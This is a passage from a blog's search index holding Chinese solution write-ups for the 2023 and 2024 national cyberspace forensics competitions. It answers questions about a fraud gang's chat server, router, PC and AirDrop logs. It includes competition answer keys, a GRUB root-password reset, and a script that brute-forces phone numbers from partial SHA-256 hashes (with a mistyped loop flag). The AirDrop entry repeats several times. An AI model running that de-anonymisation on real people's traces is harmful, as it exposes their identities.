","date":"2024-05-10","objectID":"/2024fic/:2:32","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#32rocketchat服务器中聊天服务的端口号是"},{"categories":["Forensics","wp"],"content":"\r33.rocketchat服务器中，聊天服务的管理员的邮箱是？ admin@admin.com ","date":"2024-05-10","objectID":"/2024fic/:2:33","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#33rocketchat服务器中聊天服务的管理员的邮箱是"},{"categories":["Forensics","wp"],"content":"\r34.rocketchat服务器中，聊天服务使用的数据库的版本号是？ 5.0.24 ","date":"2024-05-10","objectID":"/2024fic/:2:34","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#34rocketchat服务器中聊天服务使用的数据库的版本号是"},{"categories":["Forensics","wp"],"content":"\r35.rocketchat服务器中，最大的文件上传大小是？（以字节为单位） 104857600 ","date":"2024-05-10","objectID":"/2024fic/:2:35","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#35rocketchat服务器中最大的文件上传大小是以字节为单位"},{"categories":["Forensics","wp"],"content":"\r36.rocketchat服务器中，管理员账号的创建时间为？ 2024/3/14 8:19:54 重置密码https://cn.linux-console.net/?p=1538 在启动系统时按e进入编辑模式 在此处 修改为rw single init=/bin/bash 随后按CTRL+x，进入命令行模式 输入mount -a ，之后passwd root进行密码更新，然后重启即可登录 开启ssh允许root用户密码登录 vi /etc/ssh/sshd_config 去掉注释 开启允许root用户登录 保存，重启sshd systemctl restart sshd docker inspect 92 | more 使用ssh隧道连接容器内的MongoDB ","date":"2024-05-10","objectID":"/2024fic/:2:36","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#36rocketchat服务器中管理员账号的创建时间为"},{"categories":["Forensics","wp"],"content":"\r37.rocketchat服务器中，技术员提供的涉诈网站地址是？ http://172.16.80.47 ","date":"2024-05-10","objectID":"/2024fic/:2:37","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#37rocketchat服务器中技术员提供的涉诈网站地址是"},{"categories":["Forensics","wp"],"content":"\r38.综合分析服务器，该团伙的利润分配方案中，老李的利润占比是多少 35% ","date":"2024-05-10","objectID":"/2024fic/:2:38","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#38综合分析服务器该团伙的利润分配方案中老李的利润占比是多少"},{"categories":["Forensics","wp"],"content":"\r39.综合分析服务器，该团队“杀猪盘”收网的可能时间段为 2024/3/15 16:00:00-17:00:00 ","date":"2024-05-10","objectID":"/2024fic/:2:39","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#39综合分析服务器该团队杀猪盘收网的可能时间段为"},{"categories":["Forensics","wp"],"content":"\r40.请综合分析，警方未抓获的重要嫌疑人，其使用聊天平台时注册邮箱号为？ lao@su.com ","date":"2024-05-10","objectID":"/2024fic/:2:40","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#40请综合分析警方未抓获的重要嫌疑人其使用聊天平台时注册邮箱号为"},{"categories":["Forensics","wp"],"content":"\r41.分析openwrt镜像，该系统的主机名为 iStoreOS 访问http://192.168.8.131/，root/hl@7001 ","date":"2024-05-10","objectID":"/2024fic/:2:41","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#41分析openwrt镜像该系统的主机名为"},{"categories":["Forensics","wp"],"content":"\r42.分析openwrt镜像，该系统的内核版本为 5.10.201 图见上题 ","date":"2024-05-10","objectID":"/2024fic/:2:42","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#42分析openwrt镜像该系统的内核版本为"},{"categories":["Forensics","wp"],"content":"\r43.分析openwrt镜像，该静态ip地址为 192.168.8.5 在Windows的访问记录里 ","date":"2024-05-10","objectID":"/2024fic/:2:43","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#43分析openwrt镜像该静态ip地址为"},{"categories":["Forensics","wp"],"content":"\r44.分析openwrt镜像，所用网卡的名称为 br-lan ","date":"2024-05-10","objectID":"/2024fic/:2:44","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#44分析openwrt镜像所用网卡的名称为"},{"categories":["Forensics","wp"],"content":"\r45.分析openwrt镜像，该系统中装的docker的版本号为、 20.10.22 ","date":"2024-05-10","objectID":"/2024fic/:2:45","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#45分析openwrt镜像该系统中装的docker的版本号为"},{"categories":["Forensics","wp"],"content":"\r46.分析openwrt镜像，nastools的配置文件路径为 /root/Configs/NasTools ","date":"2024-05-10","objectID":"/2024fic/:2:46","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#46分析openwrt镜像nastools的配置文件路径为"},{"categories":["Forensics","wp"],"content":"\r47.分析openwrt镜像，使用的vpn代理软件为 PassWall2 ","date":"2024-05-10","objectID":"/2024fic/:2:47","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#47分析openwrt镜像使用的vpn代理软件为"},{"categories":["Forensics","wp"],"content":"\r48.分析openwrt镜像，vpn实际有多少个可用节点 54 ","date":"2024-05-10","objectID":"/2024fic/:2:48","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#48分析openwrt镜像vpn实际有多少个可用节点"},{"categories":["Forensics","wp"],"content":"\r49.分析openwrt镜像，节点socks的监听端口是多少 1070 ","date":"2024-05-10","objectID":"/2024fic/:2:49","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#49分析openwrt镜像节点socks的监听端口是多少"},{"categories":["Forensics","wp"],"content":"\r50.分析openwrt镜像，vpn的订阅链接是 https://pqjc.site/api/v1/client/subscribe?token=243d7bf31ca985f8d496ce078333196a ","date":"2024-05-10","objectID":"/2024fic/:2:50","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#50分析openwrt镜像vpn的订阅链接是"},{"categories":["Forensics","wp"],"content":"\rwindows镜像","date":"2024-05-10","objectID":"/2024fic/:3:0","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#windows镜像"},{"categories":["Forensics","wp"],"content":"\r1.分析技术员赵某的windows镜像，并计算赵某计算机的原始镜像的SHA1值为？ FFD2777C0B966D5FC07F2BAED1DA5782F8DE5AD6 ","date":"2024-05-10","objectID":"/2024fic/:3:1","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#1分析技术员赵某的windows镜像并计算赵某计算机的原始镜像的sha1值为"},{"categories":["Forensics","wp"],"content":"\r2.分析技术员赵某的windows镜像，疑似VeraCrypt加密容器的文件的SHA1值为？ b25e2804b586394778c800d410ed7bcdc05a19c8 ","date":"2024-05-10","objectID":"/2024fic/:3:2","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#2分析技术员赵某的windows镜像疑似veracrypt加密容器的文件的sha1值为"},{"categories":["Forensics","wp"],"content":"\r3.据赵某供述，他会将常用的密码放置在一个文档内，分析技术员赵某的windows镜像，找到技术员赵某的密码字典，并计算该文件的SHA1值? E6EB3D28C53E903A71880961ABB553EF09089007 ","date":"2024-05-10","objectID":"/2024fic/:3:3","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#3据赵某供述他会将常用的密码放置在一个文档内分析技术员赵某的windows镜像找到技术员赵某的密码字典并计算该文件的sha1值"},{"categories":["Forensics","wp"],"content":"\r4.据赵某供述，他将加密容器的密码隐写在一张图片内，隐写在图片中的容器密码是? qwerasdfzxcv ","date":"2024-05-10","objectID":"/2024fic/:3:4","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#4据赵某供述他将加密容器的密码隐写在一张图片内隐写在图片中的容器密码是"},{"categories":["Forensics","wp"],"content":"\r5.分析技术员赵某的windows镜像，bitlocker的恢复密钥是什么 404052-011088-453090-291500-377751-349536-330429-257235 用veracrypt将2024.fic解开，密码如上题 ","date":"2024-05-10","objectID":"/2024fic/:3:5","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#5分析技术员赵某的windows镜像bitlocker的恢复密钥是什么"},{"categories":["Forensics","wp"],"content":"\r6.分析技术员赵某的windows镜像，bitlocker分区的起始扇区数是 146794496 ","date":"2024-05-10","objectID":"/2024fic/:3:6","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#6分析技术员赵某的windows镜像bitlocker分区的起始扇区数是"},{"categories":["Forensics","wp"],"content":"\r7.分析技术员赵某的windows镜像，默认的浏览器是 Chrome ","date":"2024-05-10","objectID":"/2024fic/:3:7","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#7分析技术员赵某的windows镜像默认的浏览器是"},{"categories":["Forensics","wp"],"content":"\r8.分析技术员赵某的windows镜像，私有聊天服务器的密码为 Zhao 9.分析技术员赵某的windows镜像，嫌疑人计算机中有疑似使用AI技术生成的进行赌博宣传的图片，该图片中，宣传的赌博网站地址为？ https://www.585975.com/ ","date":"2024-05-10","objectID":"/2024fic/:3:8","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#8分析技术员赵某的windows镜像私有聊天服务器的密码为"},{"categories":["Forensics","wp"],"content":"\r10.分析技术员赵某的windows镜像，赵某使用的AI换脸工具名称为？ ROOP ","date":"2024-05-10","objectID":"/2024fic/:3:9","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#10分析技术员赵某的windows镜像赵某使用的ai换脸工具名称为"},{"categories":["Forensics","wp"],"content":"\r11.分析技术员赵某的windows镜像，使用AI换脸功能生成了一张图片，该图片的名称为 db.jpg ","date":"2024-05-10","objectID":"/2024fic/:3:10","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#11分析技术员赵某的windows镜像使用ai换脸功能生成了一张图片该图片的名称为"},{"categories":["Forensics","wp"],"content":"\r12.分析技术员赵某的windows镜像，ai换脸生成图片的参数中–similar-face-distance值为 0.85 ","date":"2024-05-10","objectID":"/2024fic/:3:11","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#12分析技术员赵某的windows镜像ai换脸生成图片的参数中--similar-face-distance值为"},{"categories":["Forensics","wp"],"content":"\r13.分析技术员赵某的windows镜像，嫌疑人使用AI换脸功能所使用的原始图片名称为 dst01.jpeg ","date":"2024-05-10","objectID":"/2024fic/:3:12","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#13分析技术员赵某的windows镜像嫌疑人使用ai换脸功能所使用的原始图片名称为"},{"categories":["Forensics","wp"],"content":"\r14.分析技术员赵某的windows镜像，赵某与李某沟通中提到的“二维码”解密所用的网站url地址为？ http://hi.pcmoe.net/buddha.html ","date":"2024-05-10","objectID":"/2024fic/:3:13","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#14分析技术员赵某的windows镜像赵某与李某沟通中提到的二维码解密所用的网站url地址为"},{"categories":["Forensics","wp"],"content":"\r15.分析技术员赵某的windows镜像，赵某架设聊天服务器的原始IP地址为？ 192.168.8.17 ","date":"2024-05-10","objectID":"/2024fic/:3:14","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#15分析技术员赵某的windows镜像赵某架设聊天服务器的原始ip地址为"},{"categories":["Forensics","wp"],"content":"\r16.分析技术员赵某的windows镜像，据赵某交代，其在窝点中直接操作服务器进行部署，环境搭建好了之后，使用个人计算机登录聊天室进行沟通，请分析赵某第一次访问聊天室的时间为？ 2024-03-14 20:32:08 ","date":"2024-05-10","objectID":"/2024fic/:3:15","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#16分析技术员赵某的windows镜像据赵某交代其在窝点中直接操作服务器进行部署环境搭建好了之后使用个人计算机登录聊天室进行沟通请分析赵某第一次访问聊天室的时间为"},{"categories":["Forensics","wp"],"content":"\r17.分析技术员赵某的windows镜像，openwrt的后台管理密码是 hl@7001 ","date":"2024-05-10","objectID":"/2024fic/:3:16","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#17分析技术员赵某的windows镜像openwrt的后台管理密码是"},{"categories":["Forensics","wp"],"content":"\r18.分析技术员赵某的windows镜像，嫌疑人可能使用什么云来进行文件存储？ 易有云 ","date":"2024-05-10","objectID":"/2024fic/:3:17","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#18分析技术员赵某的windows镜像嫌疑人可能使用什么云来进行文件存储"},{"categories":["Forensics","wp"],"content":"\r19.分析技术员赵某的windows镜像，工资表密码是多少 aa123456 ","date":"2024-05-10","objectID":"/2024fic/:3:18","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#19分析技术员赵某的windows镜像工资表密码是多少"},{"categories":["Forensics","wp"],"content":"\r20.分析技术员赵某的windows镜像，张伟的工资是多少 28300 ","date":"2024-05-10","objectID":"/2024fic/:3:19","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#20分析技术员赵某的windows镜像张伟的工资是多少"},{"categories":["Forensics","wp"],"content":"除了两个程序分析 ","date":"2024-05-06","objectID":"/2023fic/:0:0","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#"},{"categories":["Forensics","wp"],"content":"\r涉案苹果手机日志备份检验VC容器密码： 2023FIC@HeFei~wecomeback ","date":"2024-05-06","objectID":"/2023fic/:1:0","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#涉案苹果手机日志备份检验"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#1请分析苹果手机导出日志airdrop所使用的扫描模式scanning-mode为"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#2airdrop服务计划监听端口号是多少"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#3airdrop中接收到图片的uuid格式的识别码是多少标准格式12345678-1234-5678-1234-567812345678"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#4airdrop日志中可以看到几条接收记录"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#5airdrop日志中可以分析出图片发送人是谁标准格式中文名"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + str(phone_prefix) + str(num_str) hash_start = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [:5] hash_end = hashlib.sha256(str(phone_num).encode('UTF-8')).hexdigest() [-5:] if hash_start == \"eeb48\" and hash_end == \"2d99d\": print(\"找到手机号：\", phone_num) Found = True break if found: break ","date":"2024-05-06","objectID":"/2023fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2023 全国网络空间取证竞赛","uri":"/2023fic/#6airdrop日志中可以分析出发送图片的设备名称是什么标准格式ipad-11"},{"categories":["Forensics","wp"],"content":"\r1.请分析苹果手机导出日志，airdrop所使用的扫描模式（Scanning Mode）为？ Contacts Only 2.AirDrop服务计划监听端口号是多少？ 8770 3.AirDrop中接收到图片的uuid格式的识别码是多少？（标准格式:12345678-1234-5678-1234-567812345678） DC305C27-CB72-4786-8E0A-5346CD7B0D6A 4.AirDrop日志中可以看到几条接收记录？ 1 5.AirDrop日志中可以分析出图片发送人是谁？（标准格式:中文名） 卢冠华 6.AirDrop日志中可以分析出发送图片的设备名称是什么？（标准格式:Ipad 11） MatePad Pro 12.9 7.AirDrop日志中可以分析出发送人AppleID邮箱是什么？(标准格式:12345@qq.com) 4979ecbb-5312-4801-851d-a959ec847463@inbox.appleid.apple.com 8.AirDrop日志中可以分析出发送的图片文件名是什么？(标准格式：1.txt) IMG_3204.pvt 9.AirDrop日志中可以分析投送嫌疑人的手机号的SHA256后五位是？ 2d99d 10.请结合工具分析日志，找出Airdrop投送方的手机号码？（答案格式：18877776666） 8618697928485 得知的嫌疑人手机号 sha256 值的前后五位 可以爆破出完整的手机号 在爆破的时候记得中国大陆手机号前面需要加上 86 import hashlib # 常见手机号前三位 dict = [\"186\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"130\",\"134\",\"135\",\"136\",\"137\",\"138\",\"139\",\"147\",\"150\",\"151\",\"152\",\"157\",\"158\",\"159\",\"182\",\"183\",\"184\",\"187\",\"188\",\"130\",\"131\",\"132\",\"145\",\"155\",\"166\",\"185\",\"186\",\"133\",\"149\",\"153\",\"173\",\"177\",\"180\",\"181\",\"189\",\"191\",\"199\"] found = False for phone_prefix in dict: for i in range(0, 100000000): num_str = str(i).zfill(8) phone_num = '86' + 